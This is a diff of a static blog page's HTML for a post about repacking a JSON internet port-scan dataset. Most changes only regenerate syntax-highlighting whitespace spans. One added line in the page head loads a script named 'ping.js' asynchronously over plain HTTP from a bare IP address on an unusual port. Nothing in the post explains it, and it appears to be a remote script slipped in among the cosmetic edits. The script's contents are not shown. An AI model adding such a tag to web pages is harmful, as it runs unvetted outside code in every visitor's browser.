@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -95,19 +97,19 @@ September 10, 2021
 <h2 id="loading-json">Loading JSON</h2>
 <p>The original dataset is in JSON which it is not the most space-efficient format.</p>
 <p>It consists in an array of hosts and per host we have an array of ports.</p>
-<div class="highlight-candombe"><pre><span></span><code>  <span class="p">{</span>
-    <span class="s1">&#39;ip&#39;</span><span class="o">:</span> <span class="s1">&#39;165.221.32.138&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;timestamp&#39;</span><span class="o">:</span> <span class="s1">&#39;1619562631&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;ports&#39;</span><span class="o">:</span> <span class="p">[</span>
-       <span class="p">{</span>
-         <span class="s1">&#39;port&#39;</span><span class="o">:</span> <span class="mf">21</span><span class="p">,</span>
-         <span class="s1">&#39;proto&#39;</span><span class="o">:</span> <span class="s1">&#39;tcp&#39;</span><span class="p">,</span>
-         <span class="s1">&#39;status&#39;</span><span class="o">:</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span>
-         <span class="s1">&#39;reason&#39;</span><span class="o">:</span> <span class="s1">&#39;syn-ack&#39;</span><span class="p">,</span>
-         <span class="s1">&#39;ttl&#39;</span><span class="o">:</span> <span class="mf">245</span>
-       <span class="p">}</span>
-    <span class="p">]</span>
-  <span class="p">}</span>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="s1">&#39;ip&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;165.221.32.138&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;timestamp&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;1619562631&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;ports&#39;</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">       </span><span class="p">{</span>
+<span class="w">         </span><span class="s1">&#39;port&#39;</span><span class="o">:</span><span class="w"> </span><span class="mf">21</span><span class="p">,</span>
+<span class="w">         </span><span class="s1">&#39;proto&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;tcp&#39;</span><span class="p">,</span>
+<span class="w">         </span><span class="s1">&#39;status&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;open&#39;</span><span class="p">,</span>
+<span class="w">         </span><span class="s1">&#39;reason&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;syn-ack&#39;</span><span class="p">,</span>
+<span class="w">         </span><span class="s1">&#39;ttl&#39;</span><span class="o">:</span><span class="w"> </span><span class="mf">245</span>
+<span class="w">       </span><span class="p">}</span>
+<span class="w">    </span><span class="p">]</span>
+<span class="w">  </span><span class="p">}</span>
 </code></pre></div>
 
 <p>So there is plenty room for improvements.</p>
@@ -270,7 +272,7 @@ Yes, I know, 22 is less than 80 but it is meaningless: “ssh” is less than �
 
 <h2 id="final-bits">Final bits</h2>
 <p>Putting all this together in <a href="/assets/network/internet_scan/repack.py">repack.py</a> and presto!</p>
-<div class="highlight-candombe"><pre><span></span><code>unzip -p archive.zip <span class="p">|</span> python repack.py
+<div class="highlight-candombe"><pre><span></span><code>unzip<span class="w"> </span>-p<span class="w"> </span>archive.zip<span class="w"> </span><span class="p">|</span><span class="w"> </span>python<span class="w"> </span>repack.py
 </code></pre></div>
 
 <script src="https://utteranc.es/client.js"
